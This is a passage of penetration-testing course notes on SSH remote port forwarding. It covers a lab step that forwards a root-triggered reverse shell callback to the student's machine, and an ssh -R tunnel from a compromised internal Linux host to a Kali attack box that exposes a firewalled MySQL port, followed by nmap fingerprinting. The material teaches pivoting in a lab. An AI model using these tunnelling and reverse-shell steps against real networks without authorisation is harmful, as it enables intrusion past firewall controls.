### Remote Port Forwarding

##### Remote Port Forwarding example

The target VM #1 machine has an exploit that is triggered by root every minute that executes a basic _reverse shell_. Unfortunately, that shell is trying to connect back to the internal port _5555_ on _127.0.0.1_ on that server, and the server has no tools available to catch this shell. To solve this challenge, forward this reverse shell callback from the remote server to your local machine

```bash
ssh -p 2222 -N -R 192.168.201.52:5555:127.0.0.1:4444 student@192.168.201.52 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
```

The _remote port forwarding_ feature in SSH can be thought of as the reverse of local port forwarding, in that a port is opened on the _remote_ side of the connection and traffic sent to that port is forwarded to a port on our local machine (the machine initiating the SSH client).

In short, connections to the specified TCP port on the remote host will be forwarded to the specified port on the local machine. 

In this case, we have access to a non-root shell on a Linux client on the internal network. On this compromised machine, we discover that a MySQL server is running on TCP port 3306. Unlike the previous scenario, the firewall is blocking inbound TCP port 22 (SSH) connections, so we can't SSH into this server from our Internet-connected Kali machine.

We can, however, SSH from this server _out_ to our Kali attacking machine, since outbound TCP port 22 is allowed through the firewall. We can leverage SSH remote port forwarding (invoked with ssh -R) to open a port on our Kali machine that forwards traffic to the MySQL port (TCP 3306) on the internal server. All forwarded traffic will traverse the SSH tunnel, right through the firewall.

SSH port forwards can be run as non-root users as long as we only bind unused non-privileged local ports (above 1024).

The ssh command syntax to create this tunnel will include the local IP and port, the remote IP and port, and -R to specify a remote forward:

```
ssh -N -R [bind_address:]port:host:hostport [username@address]
```

In this case, we will ssh out to our Kali machine as the kali user (kali@10.11.0.4), specify no commands (-N), and a remote forward (-R). We will open a listener on TCP port 2221 on our Kali machine (10.11.0.4:2221) and forward connections to the internal Linux machine's TCP port 3306 (127.0.0.1:3306):

```
student@debian:~$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
kali@10.11.0.4's password: 
```

This will forward all incoming traffic on our Kali system's local port 2221 to port 3306 on the compromised box through an SSH tunnel (TCP 22), allowing us to reach the MySQL port even though it is filtered at the firewall.

![Figure 4: Remote port forwarding diagram](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/port_redirection_and_tunneling/46359c6384d076bf7e8d2954501a6154-port_redirection_and_tunneling_diagram_04.png)

With the tunnel up, we can switch to our Kali machine, validate that TCP port 2221 is listening, and scan the localhost on that port with nmap, which will fingerprint the target’s MySQL service:

```
kali@kali:~$ ss -antp | grep "2221"
LISTEN   0   128    127.0.0.1:2221     0.0.0.0:*      users:(("sshd",pid=2294,fd=9))
LISTEN   0   128      [::1]:2221         [::]:*       users:(("sshd",pid=2294,fd=8))
    
kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 2221

Nmap scan report for localhost (127.0.0.1)
Host is up (0.000039s latency).

PORT     STATE SERVICE VERSION
2221/tcp open  mysql   MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1

Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds
```

nowing that we can scan the port, we should have no problem interacting with the MySQL service across the SSH tunnel using any of the appropriate Kali-installed tools.